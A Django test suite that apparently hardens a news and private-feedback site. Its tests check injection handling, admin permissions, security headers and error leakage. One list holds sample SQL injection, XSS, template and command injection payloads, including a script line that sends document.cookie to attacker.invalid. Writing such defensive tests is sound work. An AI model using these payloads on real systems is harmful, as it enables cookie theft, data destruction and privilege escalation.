"""Synthetic attacks against DB boundaries, private responses and admin output."""
import html
import sqlite3
from types import SimpleNamespace
from unittest.mock import patch
from urllib.parse import urlencode

from cryptography.fernet import Fernet
from django.conf import settings
from django.contrib.auth import get_user_model
from django.contrib.auth.models import Permission
from django.core.exceptions import PermissionDenied
from django.db import connection, DatabaseError, OperationalError
from django.test import Client, RequestFactory, TestCase, override_settings
from django.views.debug import get_exception_reporter_filter

from .feedback_security import feedback_cipher
from .middleware import RequestLimitsMiddleware
from .models import News, PrivateFeedback


@override_settings(DEBUG=False, SECURE_SSL_REDIRECT=False, FEEDBACK_GLOBAL_LIMIT=200,
                   FEEDBACK_ENCRYPTION_KEYS=[Fernet.generate_key().decode()])
class BackendHardeningTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.news = News.objects.create(title='Unchanged public title', slug='unchanged', excerpt='Public summary', content='Unchanged text')
        cls.draft = News.objects.create(title='DRAFT_HIDDEN_SENTINEL', slug='private-draft-new', excerpt='Private', content='DRAFT_HIDDEN_SENTINEL', is_published=False)
        cls.reader = get_user_model().objects.create_user('private-reader', is_staff=True)
        cls.reader.user_permissions.add(Permission.objects.get(codename='view_privatefeedback'))
        cls.other = get_user_model().objects.create_user('other-editor', is_staff=True)
        cls.other.user_permissions.add(Permission.objects.get(codename='change_news'))

    def submit(self, message, **extra):
        return self.client.post('/contacts/feedback/', urlencode({'message': message, **extra}), content_type='application/x-www-form-urlencoded')

    def make_feedback(self, message='A confidential synthetic message'):
        return PrivateFeedback.objects.create(encrypted_message=feedback_cipher().encrypt(message.encode()).decode())

    def test_sql_html_template_and_command_injection_are_inert_data(self):
        payloads = [
            "' OR 1=1; DROP TABLE core_news; --", '" UNION SELECT password FROM auth_user --',
            "'); UPDATE auth_user SET is_superuser=1; --", "'); SELECT pg_sleep(1); --",
            '{{ settings.SECRET_KEY }} {% debug %}', '${7*7} <%= 7*7 %>',
            '<script>fetch("https://attacker.invalid/?data="+document.cookie)</script>',
            '<img src=x onerror=alert(document.cookie)>', '<svg onload=alert(1)>svg</svg>',
            '[link](javascript:alert(1))', '$(whoami); powershell -Command echo injected',
            '__class__.__mro__.__subclasses__() and prototype pollution',
        ]
        for index, payload in enumerate(payloads):
            with self.subTest(index=index):
                response = self.client.post('/contacts/feedback/', urlencode({'message': payload}),
                    content_type='application/x-www-form-urlencoded', REMOTE_ADDR=f'192.0.2.{index+1}')
                self.assertEqual(response.status_code, 302)
                row = PrivateFeedback.objects.latest('pk')
                self.assertEqual(feedback_cipher().decrypt(row.encrypted_message.encode()).decode(), payload)
                self.assertNotIn(payload, row.encrypted_message)
        self.news.refresh_from_db()
        self.assertEqual((self.news.title, self.news.content, self.news.is_published), ('Unchanged public title', 'Unchanged text', True))
        self.other.refresh_from_db()
        self.assertFalse(self.other.is_superuser)
        self.assertEqual(News.objects.count(), 2)
        with connection.cursor() as cursor:
            if connection.vendor == 'sqlite':
                cursor.execute('PRAGMA integrity_check')
                self.assertEqual(cursor.fetchone()[0], 'ok')

    def test_query_manipulation_does_not_write_or_publish(self):
        for route in ('/', '/news/', '/gallery/', '/news-gallery/', self.news.get_absolute_url()):
            for query in ({'action': 'delete_selected', '_selected_action': self.news.pk, 'is_published': 'true'},
                          {'cat': "' UNION SELECT password FROM auth_user --"},
                          {'is_published__in': 'true,false', 'content__regex': '.*', 'owner_id': self.other.pk}):
                response = self.client.get(route, query)
                self.assertIn(response.status_code, (200, 404))
                self.assertNotIn(b'DRAFT_HIDDEN_SENTINEL', response.content)
        self.assertEqual(News.objects.count(), 2)
        self.news.refresh_from_db()
        self.draft.refresh_from_db()
        self.assertEqual(self.news.title, 'Unchanged public title')
        self.assertFalse(self.draft.is_published)

    def test_mass_assignment_of_ciphertext_and_database_fields_is_rejected(self):
        for key in ('encrypted_message', 'id', 'created_at', 'user_id', 'is_superuser', '__proto__', 'message__regex'):
            self.assertEqual(self.submit('A valid synthetic review', **{key: 'malicious replacement'}).status_code, 400)
        self.assertFalse(PrivateFeedback.objects.exists())

    def test_sql_values_remain_bound_parameters(self):
        payload = "' OR 1=1; DROP TABLE core_news; --"
        records = []

        def observe(execute, sql, params, many, context):
            records.append((sql, params))
            return execute(sql, params, many, context)

        with connection.execute_wrapper(observe):
            self.assertEqual(self.client.get('/news/', {'cat': payload}).status_code, 404)
            self.assertEqual(self.submit(payload).status_code, 302)
        matches = [(sql, params) for sql, params in records if params and payload in params]
        self.assertTrue(matches)
        self.assertTrue(all(payload not in sql for sql, _ in matches))
        ciphertext = PrivateFeedback.objects.get().encrypted_message
        inserts = [(sql, params) for sql, params in records if sql.startswith('INSERT INTO "core_privatefeedback"')]
        self.assertEqual(len(inserts), 1)
        self.assertNotIn(payload, inserts[0][0])
        self.assertNotIn(ciphertext, inserts[0][0])
        self.assertIn(ciphertext, inserts[0][1])

    def test_admin_displays_plain_unicode_as_escaped_text_only(self):
        payload = 'Отзыв №99: «Спасибо» & <script>alert("x")</script> {{ 7*7 }}'
        row = self.make_feedback(payload)
        self.client.force_login(self.reader)
        listing = self.client.get('/admin/core/privatefeedback/')
        self.assertEqual(listing.status_code, 200)
        self.assertNotIn(payload.encode(), listing.content)
        self.assertNotContains(listing, row.encrypted_message)
        detail = self.client.get(f'/admin/core/privatefeedback/{row.pk}/change/')
        self.assertEqual(detail.status_code, 200)
        self.assertContains(detail, html.escape(payload))
        self.assertNotContains(detail, '<script>alert(')
        self.assertNotContains(detail, row.encrypted_message)
        self.assertNotContains(detail, settings.FEEDBACK_ENCRYPTION_KEYS[0])
        self.assertNotContains(detail, 'name="encrypted_message"')

    def test_damaged_ciphertext_cannot_inject_html_or_crash_admin(self):
        row = self.make_feedback()
        self.client.force_login(self.reader)
        for bad in ('broken ciphertext', '<script>alert(1)</script>', 'повреждено'):
            PrivateFeedback.objects.filter(pk=row.pk).update(encrypted_message=bad)
            response = self.client.get(f'/admin/core/privatefeedback/{row.pk}/change/')
            self.assertEqual(response.status_code, 200)
            self.assertContains(response, 'Не удалось расшифровать отзыв.')
            self.assertNotContains(response, bad)

    def test_direct_admin_urls_and_header_spoof_do_not_grant_access(self):
        row = self.make_feedback('FEEDBACK_PRIVATE_ONLY_SENTINEL')
        for user in (None, self.other):
            self.client.logout()
            if user:
                self.client.force_login(user)
            for suffix in ('', '?_popup=1', '?_to_field=id', '?encrypted_message__isnull=false'):
                response = self.client.get(f'/admin/core/privatefeedback/{row.pk}/change/{suffix}',
                    HTTP_X_USER_ROLE='superuser', HTTP_X_FORWARDED_USER='admin', HTTP_AUTHORIZATION='Bearer forged')
                self.assertIn(response.status_code, (302, 403))
                self.assertNotContains(response, 'FEEDBACK_PRIVATE_ONLY_SENTINEL', status_code=response.status_code)
            self.assertIn(self.client.get(f'/admin/core/privatefeedback/{row.pk}/history/').status_code, (302, 403))

    def test_revoking_permission_closes_access_on_next_request(self):
        row = self.make_feedback()
        url = f'/admin/core/privatefeedback/{row.pk}/change/'
        self.client.force_login(self.reader)
        self.assertEqual(self.client.get(url).status_code, 200)
        self.reader.user_permissions.clear()
        self.assertEqual(self.client.get(url).status_code, 403)

    def test_unprivileged_staff_cannot_read_via_admin_changelist_or_actions(self):
        row = self.make_feedback('PRIVATE_VIEW_SENTINEL')
        self.client.force_login(self.other)
        for route in ('/admin/core/privatefeedback/', f'/admin/core/privatefeedback/{row.pk}/delete/'):
            self.assertEqual(self.client.get(route).status_code, 403)
        self.client.post('/admin/core/privatefeedback/', {'action': 'delete_selected', '_selected_action': row.pk, 'post': 'yes'})
        self.assertTrue(PrivateFeedback.objects.filter(pk=row.pk).exists())

    def test_private_pages_no_cache_no_referrer_no_third_party_scripts(self):
        row = self.make_feedback()
        self.client.force_login(self.reader)
        for route in ('/contacts/', '/admin/', '/admin/core/privatefeedback/', f'/admin/core/privatefeedback/{row.pk}/change/'):
            response = self.client.get(route)
            self.assertEqual(response.status_code, 200)
            self.assertIn('no-store', response['Cache-Control'])
            self.assertEqual(response['Referrer-Policy'], 'no-referrer')
            self.assertEqual(response['Cross-Origin-Resource-Policy'], 'same-origin')
            self.assertIn("script-src 'self';", response['Content-Security-Policy'])
            for header in ('Server', 'X-Powered-By', 'Access-Control-Allow-Origin', 'Access-Control-Allow-Credentials'):
                self.assertNotIn(header, response)
        self.assertEqual(self.client.get('/admin/')['X-Robots-Tag'], 'noindex, nofollow, noarchive')

    def test_public_html_headers_and_javascript_do_not_expose_private_canaries(self):
        marker = 'PRIVATE_FEEDBACK_RESPONSE_CANARY'
        row = self.make_feedback(marker)
        secret = 'TEST_ONLY_SERVER_SECRET_CANARY_' * 3
        key_path = '/private/TEST_ONLY_KEY_FILE_CANARY'
        with override_settings(SECRET_KEY=secret, FEEDBACK_ENCRYPTION_KEY_FILE=key_path):
            for route in ('/', '/contacts/', '/news/', '/gallery/', '/news-gallery/', '/healthz/', '/not-a-public-page/',
                          '/static/js/main.js', '/static/js/career-test.js', '/admin/login/'):
                response = self.client.get(route)
                content = b''.join(response.streaming_content) if response.streaming else response.content
                combined = content + repr(dict(response.headers)).encode()
                for canary in (marker, row.encrypted_message, secret, key_path):
                    self.assertFalse(canary.encode() in combined, f'Private canary leaked at {route}')

    def test_internal_errors_and_database_failure_do_not_leak_to_public(self):
        client = Client(raise_request_exception=False)
        for route, exception in (('/', RuntimeError('PRIVATE_INTERNAL_PATH_PASSWORD_SENTINEL')),
                                 ('/about/', PermissionDenied('PRIVATE_INTERNAL_PATH_PASSWORD_SENTINEL'))):
            with patch('core.views.render', side_effect=exception):
                response = client.get(route)
            self.assertIn(response.status_code, (403, 500))
            for marker in (b'PRIVATE_INTERNAL_PATH_PASSWORD_SENTINEL', b'Traceback', b'urlpatterns', b'plit99_project', b'SECRET_KEY'):
                self.assertNotIn(marker, response.content)
        with patch('core.views.PrivateFeedback.objects.create', side_effect=DatabaseError('DB_PASSWORD_SENTINEL')):
            response = self.submit('PRIVATE_MESSAGE_SENTINEL')
        self.assertEqual(response.status_code, 503)
        self.assertNotContains(response, 'DB_PASSWORD_SENTINEL', status_code=503)
        self.assertNotContains(response, 'PRIVATE_MESSAGE_SENTINEL', status_code=503)
        self.assertEqual(PrivateFeedback.objects.count(), 0)

    def test_private_post_is_redacted_in_django_error_reports(self):
        response = self.submit('PRIVATE_REPORT_SENTINEL')
        request = response.wsgi_request
        filtered = get_exception_reporter_filter(request).get_post_parameters(request)
        self.assertNotEqual(filtered['message'], 'PRIVATE_REPORT_SENTINEL')

    def test_sqlite_lock_retry_does_not_duplicate_message_or_consume_quota_twice(self):
        from .models import AdminLoginThrottle
        original = PrivateFeedback.objects.create
        calls = 0

        def insert(**kwargs):
            nonlocal calls
            calls += 1
            if calls == 1:
                cause = sqlite3.OperationalError('synthetic locked database')
                cause.sqlite_errorcode = sqlite3.SQLITE_BUSY
                raise OperationalError('synthetic transient lock') from cause
            return original(**kwargs)

        with patch('core.views.PrivateFeedback.objects.create', side_effect=insert):
            self.assertEqual(self.submit('Synthetic message for bounded retry').status_code, 302)
        self.assertEqual(calls, 2)
        self.assertEqual(PrivateFeedback.objects.count(), 1)
        self.assertEqual(list(AdminLoginThrottle.objects.values_list('attempts', flat=True)), [1, 1])

    def test_unknown_database_error_is_not_retried(self):
        with patch('core.views.PrivateFeedback.objects.create', side_effect=OperationalError('synthetic non-lock error')) as insert:
            self.assertEqual(self.submit('Synthetic unknown database failure').status_code, 503)
        self.assertEqual(insert.call_count, 1)
        self.assertEqual(PrivateFeedback.objects.count(), 0)

    @override_settings(SECURE_SSL_REDIRECT=True, SECURE_PROXY_SSL_HEADER=None,
                       SESSION_COOKIE_SECURE=True, CSRF_COOKIE_SECURE=True, SECURE_HSTS_SECONDS=31536000)
    def test_https_policy_cookies_and_cross_origin_csrf(self):
        client = Client(enforce_csrf_checks=True)
        response = client.post('/contacts/feedback/', urlencode({'message': 'Plain HTTP cannot write this review'}),
                               content_type='application/x-www-form-urlencoded', HTTP_X_FORWARDED_PROTO='https')
        self.assertEqual(response.status_code, 301)
        self.assertFalse(PrivateFeedback.objects.exists())
        form = client.get('/contacts/', secure=True)
        self.assertTrue(form.cookies['csrftoken']['secure'])
        self.assertIn('max-age=31536000', form['Strict-Transport-Security'])
        token = client.cookies['csrftoken'].value
        data = urlencode({'message': 'Secure synthetic review', 'csrfmiddlewaretoken': token})
        self.assertEqual(client.post('/contacts/feedback/', data, content_type='application/x-www-form-urlencoded', secure=True, HTTP_ORIGIN='https://attacker.invalid').status_code, 403)
        self.assertEqual(client.post('/contacts/feedback/', data, content_type='application/x-www-form-urlencoded', secure=True, HTTP_ORIGIN='https://testserver').status_code, 302)
        self.assertEqual(PrivateFeedback.objects.count(), 1)

    def test_large_upload_permission_is_checked_before_post_parsing(self):
        middleware = RequestLimitsMiddleware(lambda request: None)
        factory = RequestFactory()
        for user, view, allowed in (
            (self.other, 'admin:core_news_change', True),
            (self.other, 'admin:core_news_add', False),
            (self.reader, 'admin:core_news_change', False),
            (self.other, 'submit_feedback', False),
        ):
            request = factory.post('/synthetic/', data=b'--test--\r\n', content_type='multipart/form-data; boundary=test')
            request.META['CONTENT_LENGTH'] = str(100 * 1024 * 1024)
            request.user = user
            request.resolver_match = SimpleNamespace(view_name=view)
            response = middleware.process_view(request, None, (), {})
            self.assertEqual(response is None, allowed,
                (view, user.is_active, user.is_staff, user.has_perm('core.change_news'), request.method, request.content_type, getattr(response, 'status_code', None)))
            self.assertFalse(hasattr(request, '_post'))
        for invalid in ('-1', '9' * 5000, 'not-an-integer'):
            request.META['CONTENT_LENGTH'] = invalid
            self.assertEqual(middleware.process_view(request, None, (), {}).status_code, 400)
